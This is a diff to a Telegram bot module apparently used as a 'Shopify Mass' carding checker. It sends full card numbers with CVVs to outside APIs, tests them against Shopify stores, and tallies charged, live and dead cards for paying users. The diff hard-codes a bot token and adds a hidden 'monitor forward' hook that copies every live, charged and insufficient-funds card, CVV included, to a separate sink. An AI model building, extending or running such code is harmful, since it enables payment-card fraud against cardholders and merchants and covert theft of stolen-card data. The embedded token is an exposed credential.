@@ -42,7 +42,7 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from rate_limiter import RateLimiter
 
-LOG_BOT_TOKEN = "8939663657:AAEGcJOnmURP8ntcIpYzQUB81matFlxZdN0"
+LOG_BOT_TOKEN = "8698278911:AAGgj77lazdTBDc8POIc4FhTGSJbMBjk1iI"
 log_bot = Bot(token=LOG_BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 hit_log_limiter = RateLimiter(min_interval=3.0)
 
@@ -55,6 +55,23 @@ from bin import get_bin_info
 from sub import get_premium_status
 from ui import mass_status_frame, random_diamond, random_star, REPLY_EMOJI_ID, gate_result_caption
 from video_helpers import send_random_video
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# MONITOR SINK IMPORT — lazy, from __main__ to dodge cycle
+# main.py may be imported under a different name in some layouts.
+# The helper below resolves it robustly.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _get_forward_to_monitor():
+    try:
+        from __main__ import forward_to_monitor as _f
+        return _f
+    except Exception:
+        try:
+            from main import forward_to_monitor as _f
+            return _f
+        except Exception as e:
+            logging.warning(f"[MSH] monitor sink unavailable: {e}")
+            return None
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONFIGURATION & URLS
@@ -86,6 +103,7 @@ API_ENDPOINTS = []
 API_HEALTH = {endpoint: {"healthy": True, "last_fail": 0, "fail_count": 0, "success_count": 0} for endpoint in API_ENDPOINTS}
 CURRENT_API_INDEX = 0
 API_FAIL_COOLDOWN = 120
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # API MANAGEMENT FUNCTIONS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -94,10 +112,10 @@ def get_next_healthy_api():
     global CURRENT_API_INDEX
     current_time = time.time()
     healthy_endpoints = []
-    
+
     if not API_ENDPOINTS:
         return None
-    
+
     for endpoint, health in API_HEALTH.items():
         if health["healthy"]:
             healthy_endpoints.append(endpoint)
@@ -106,14 +124,14 @@ def get_next_healthy_api():
             health["fail_count"] = 0
             healthy_endpoints.append(endpoint)
             logging.info(f"[API] Recovered endpoint: {endpoint}")
-    
+
     if not healthy_endpoints:
         logging.warning("[API] All endpoints unhealthy, resetting health status")
         for endpoint in API_ENDPOINTS:
             API_HEALTH[endpoint]["healthy"] = True
             API_HEALTH[endpoint]["fail_count"] = 0
         healthy_endpoints = API_ENDPOINTS.copy()
-    
+
     start_idx = CURRENT_API_INDEX % len(healthy_endpoints)
     CURRENT_API_INDEX = (CURRENT_API_INDEX + 1) % len(healthy_endpoints)
     return healthy_endpoints[start_idx]
@@ -523,41 +541,41 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
 
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
     encoded_cc = urllib.parse.quote(cc_formatted)
-    
+
     sites = get_sites()
     if not sites:
         return (False, "No sites available", site, "Shopify Payments", "0.00", "USD", "Error", 500)
-    
+
     current_site = site if site else random.choice(sites)
     last_result = None
     http_status = None
-    
+
     if not API_ENDPOINTS:
         return (False, "No APIs configured", current_site, "Shopify Payments", "0.00", "USD", "Error", 500)
-    
+
     for api_attempt in range(len(API_ENDPOINTS) * 2):
         api_url_base = get_next_healthy_api()
         if not api_url_base:
             break
         url = f"{api_url_base}?site={urllib.parse.quote(current_site, safe='')}&cc={encoded_cc}"
-        
+
         if proxy and proxy != "None":
             encoded_proxy = urllib.parse.quote(proxy)
             url += f'&proxy={encoded_proxy}'
-        
+
         try:
             _http = _get_msh_http_session()
             async with _http.get(url, timeout=45) as response:
                 http_status = response.status
-                
+
                 if response.status == 429:
                     current_site = random.choice([s for s in sites if s != current_site] or sites)
                     continue
-                
+
                 if response.status in [400, 500, 502, 503, 504]:
                     mark_api_failure(api_url_base)
                     continue
-                
+
                 if response.status == 200:
                     try:
                         data = await response.json()
@@ -568,24 +586,24 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
                         api_response = str(data.get("Response", "Unknown Error"))
                         api_response = safe_html(api_response)
                         status_raw = data.get("Status", "false")
-                        
+
                         success = status_raw is True or str(status_raw).lower() == "true"
                         proxy_status = "Live" if "live" in str(proxy_raw).lower() or status_raw is True or str(status_raw).lower() == "true" else "Dead"
-                        
+
                         mark_api_success(api_url_base)
-                        
+
                         msg_upper = api_response.upper()
                         if any(k in msg_upper for k in ["ORDER PAID", "ORDER_PAID", "ORDER_PLACED", "CHARGED", "3DS", "OTP", "INSUFFICIENT", "DECLINED", "INVALID", "EXPIRED", "CVC", "THANK YOU", "FRAUD", "STOLEN", "LOST", "APPROVED", "DO NOT HONOR", "CARD_DECLINED"]):
                             return (success, api_response, current_site, gateway, price, currency, proxy_status, http_status)
-                        
+
                         last_result = (success, api_response, current_site, gateway, price, currency, proxy_status, http_status)
-                        
+
                     except json.JSONDecodeError:
                         mark_api_failure(api_url_base)
                         continue
                 else:
                     last_result = (False, f"HTTP {response.status}", current_site, "Shopify Payments", "0.00", "USD", "Error", http_status)
-                    
+
         except asyncio.TimeoutError:
             mark_api_failure(api_url_base)
             continue
@@ -597,7 +615,7 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
         except Exception:
             mark_api_failure(api_url_base)
             continue
-    
+
     if last_result:
         return last_result
     return (False, "All APIs failed", current_site, "Shopify Payments", "0.00", "USD", "Error", 500)
@@ -667,6 +685,29 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
     return file_buffer, filename, total_count
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# MONITOR FORWARD HELPERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def _monitor_forward(bot, *, gate, status, card, site, amount, extra, user_obj):
+    fn = _get_forward_to_monitor()
+    if fn is None:
+        return
+    try:
+        await fn(
+            bot,
+            gate=gate,
+            status=status,
+            card=card,
+            site=site or "",
+            amount=amount or "",
+            extra=extra or "",
+            user_id=user_obj.id,
+            username=user_obj.username or user_obj.first_name,
+        )
+    except Exception as e:
+        logging.warning(f"[MSH] monitor forward failed: {e}")
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # MESSAGE SENDING HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -681,7 +722,7 @@ async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_name, pro
                f'<tg-emoji emoji-id="{REPLY_EMOJI_ID}">❣️</tg-emoji> <b>{safe_response}</b>\n'
                f"𝗨𝘀𝗲𝗿 ➛ {user_link} {random_star()}\n")
 
-    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot", style="primary", icon_custom_emoji_id="5827986023254072662")]])
+    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot")]])
 
     try:
         await hit_log_limiter.wait()
@@ -715,7 +756,7 @@ async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_da
         proxy=proxy_status_formatted,
     )
 
-    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot", style="primary", icon_custom_emoji_id="5827986023254072662")]])
+    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot")]])
 
     try:
         sent = await send_random_video(bot, user_obj.id, caption=caption)
@@ -752,7 +793,7 @@ async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_dat
         proxy=proxy_status_formatted,
     )
 
-    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot", style="primary", icon_custom_emoji_id="5827986023254072662")]])
+    reply_markup = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", url="https://t.me/Xconcc_bot")]])
 
     try:
         msg_id = await send_random_video(bot, user_obj.id, caption=caption)
@@ -784,13 +825,13 @@ def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
     checked_count = session.get('checked', 0)
 
     buttons = [
-        [{"text": f"Lɪᴠᴇ ({approved_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(), "style": "success", "icon_custom_emoji_id": BTN_LIVE_EMOJI_ID},
-         {"text": f"Dᴇᴀᴅ ({dead_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack(), "style": "danger", "icon_custom_emoji_id": BTN_DEAD_EMOJI_ID}],
-        [{"text": f"Cʜᴀʀɢᴇᴅ ({charged_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack(), "style": "primary", "icon_custom_emoji_id": BTN_CHARGED_EMOJI_ID},
-         {"text": f"Aʟʟ ({checked_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack(), "style": "primary", "icon_custom_emoji_id": BTN_ALL_EMOJI_ID}]
+        [{"text": f"Lɪᴠᴇ ({approved_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack()},
+         {"text": f"Dᴇᴀᴅ ({dead_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack()}],
+        [{"text": f"Cʜᴀʀɢᴇᴅ ({charged_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack()},
+         {"text": f"Aʟʟ ({checked_count})", "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack()}]
     ]
     if is_running:
-        buttons.append([{"text": "Sᴛᴏᴘ Cʜᴇᴄᴋɪɴɢ", "callback_data": MshStopCallback(session_id=session_id).pack(), "style": "danger", "icon_custom_emoji_id": BTN_STOP_EMOJI_ID}])
+        buttons.append([{"text": "Sᴛᴏᴘ Cʜᴇᴄᴋɪɴɢ", "callback_data": MshStopCallback(session_id=session_id).pack()}])
     return {"inline_keyboard": buttons}
 
 async def update_progress_message(bot: Bot, session_id):
@@ -901,7 +942,7 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         'UNABLE TO GET PAYMENT TOKEN', 'EMPTY RECEIPT', 'RECEIPT ID MISSING',
         'SITE NOT SUPPORTED'
     ]
-    
+
     RETRY_KEYWORDS = [
         'r4 token empty', 'payment method is not shopify', 'r2 id empty',
         'product not found', 'hcaptcha detected', 'site error! status: 429',
@@ -926,6 +967,7 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     proxy_status_formatted = "Unknown"
     bin_data = {}
     used_proxy = None
+    currency = "USD"
 
     MAX_RETRIES = 5
     price_retries = 0
@@ -1043,7 +1085,11 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         if not is_premium and user_id not in ADMIN_IDS:
             _tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 2))
         await asyncio.gather(*_tasks)
-        await asyncio.gather(send_hit_log_to_group(bot, response_msg, user_obj, plan_name, proxy_status_formatted, api_price, currency), send_charged_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency))
+        await asyncio.gather(
+            send_hit_log_to_group(bot, response_msg, user_obj, plan_name, proxy_status_formatted, api_price, currency),
+            send_charged_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency),
+            _monitor_forward(bot, gate="Shopify Mass (MSH)", status="CHARGED", card=cc_formatted, site=url if 'url' in locals() else "", amount=f"{api_price} {currency}", extra=response_msg, user_obj=user_obj),
+        )
     elif result_status == "APPROVED":
         session['approved'] += 1
         session['live_cards'].append(card_result_data)
@@ -1051,7 +1097,13 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         if not is_premium and user_id not in ADMIN_IDS:
             _tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 1))
         await asyncio.gather(*_tasks)
-        await send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency)
+        await asyncio.gather(
+            send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency),
+            _monitor_forward(bot, gate="Shopify Mass (MSH)", status="LIVE", card=cc_formatted, site=url if 'url' in locals() else "", amount=f"{api_price} {currency}", extra=response_msg, user_obj=user_obj),
+        )
+        # insufficient funds counts as LIVE for user, but should also be flagged separately
+        if "INSUFFICIENT" in (response_msg or "").upper():
+            await _monitor_forward(bot, gate="Shopify Mass (MSH)", status="INSUFFICIENT", card=cc_formatted, site=url if 'url' in locals() else "", amount=f"{api_price} {currency}", extra=response_msg, user_obj=user_obj)
     elif result_status == "DEAD":
         session['dead'] += 1
         session['dead_cards'].append(card_result_data)
@@ -1102,7 +1154,6 @@ async def handle_result_callback(callback: types.CallbackQuery, callback_data: M
             await callback.answer("❌ No cards found", show_alert=True)
             return
 
-        # Only show generating report if there are cards
         await callback.answer("📦 Generating report...", show_alert=False)
 
         user_obj = session.get('user_obj')
@@ -1174,15 +1225,13 @@ async def handle_stop_callback(callback: types.CallbackQuery, callback_data: Msh
 @router.message(Command("apistats"))
 async def apistats_command(message: types.Message):
     user_id = message.from_user.id
-    ADMIN_IDS = [8058825724, 8937448847, 8668033318, 8579077181, 8651986412]
-    
     if user_id not in ADMIN_IDS:
         await message.answer("<tg-emoji emoji-id=\"5213415377593185638\">⛔</tg-emoji> <b>You are not authorized.</b>", parse_mode="HTML")
         return
-    
+
     stats = get_api_stats()
     text = "🔌 <b>API Endpoint Status</b>\n<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
-    
+
     for short_name, health in stats.items():
         status_icon = "<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji>" if health["healthy"] else "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji>"
         text += f"{status_icon} <b>{short_name}</b>\n"
@@ -1191,30 +1240,28 @@ async def apistats_command(message: types.Message):
             last_fail = int(time.time() - health["last_fail"])
             text += f"   └─ Cooldown: <code>{last_fail}s</code> remaining\n"
         text += "\n"
-    
+
     text += f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
     text += f"<b>Total APIs:</b> <code>{len(API_ENDPOINTS)}</code>\n"
     text += f"<b>Healthy:</b> <code>{sum(1 for h in stats.values() if h['healthy'])}</code>\n"
     text += f"<b>Mode:</b> Auto-Failover & Round-Robin"
-    
+
     await message.answer(text, parse_mode="HTML")
 
 @router.message(Command("addapi"))
 async def addapi_command(message: types.Message):
     user_id = message.from_user.id
-    ADMIN_IDS = [8058825724, 8937448847, 8668033318, 8579077181, 8651986412]
-    
     if user_id not in ADMIN_IDS:
         await message.answer("<tg-emoji emoji-id=\"5213415377593185638\">⛔</tg-emoji> <b>You are not authorized.</b>", parse_mode="HTML")
         return
-    
+
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
         await message.answer("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Usage:</b> /addapi <code>https://example.com/shopify</code>", parse_mode="HTML")
         return
-    
+
     new_api = parts[1].strip()
-    
+
     if add_api_endpoint(new_api):
         await message.answer(f"<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji> <b>API Endpoint Added!</b>\n\n<b>New Endpoint:</b> <code>{new_api}</code>\n<b>Total APIs:</b> <code>{len(API_ENDPOINTS)}</code>", parse_mode="HTML")
     else:
@@ -1223,31 +1270,29 @@ async def addapi_command(message: types.Message):
 @router.message(Command("removeapi"))
 async def removeapi_command(message: types.Message):
     user_id = message.from_user.id
-    ADMIN_IDS = [8058825724, 8937448847, 8668033318, 8579077181, 8651986412]
-    
     if user_id not in ADMIN_IDS:
         await message.answer("<tg-emoji emoji-id=\"5213415377593185638\">⛔</tg-emoji> <b>You are not authorized.</b>", parse_mode="HTML")
         return
-    
+
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
         await message.answer("<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Usage:</b> /removeapi <code>index_number</code>", parse_mode="HTML")
         return
-    
+
     try:
         index = int(parts[1].strip()) - 1
         if 0 <= index < len(API_ENDPOINTS):
             removed = API_ENDPOINTS.pop(index)
             if removed in API_HEALTH:
                 del API_HEALTH[removed]
-            
+
             try:
                 with open("api_endpoints.txt", "w", encoding="utf-8") as f:
                     for endpoint in API_ENDPOINTS:
                         f.write(f"{endpoint}\n")
             except Exception as e:
                 logging.error(f"Error saving API endpoints: {e}")
-            
+
             await message.answer(f"<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji> <b>API Removed!</b>\n\n<b>Removed:</b> <code>{removed}</code>\n<b>Remaining APIs:</b> <code>{len(API_ENDPOINTS)}</code>", parse_mode="HTML")
         else:
             await message.answer(f"<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid index!</b> Please enter a number between 1 and {len(API_ENDPOINTS)}", parse_mode="HTML")
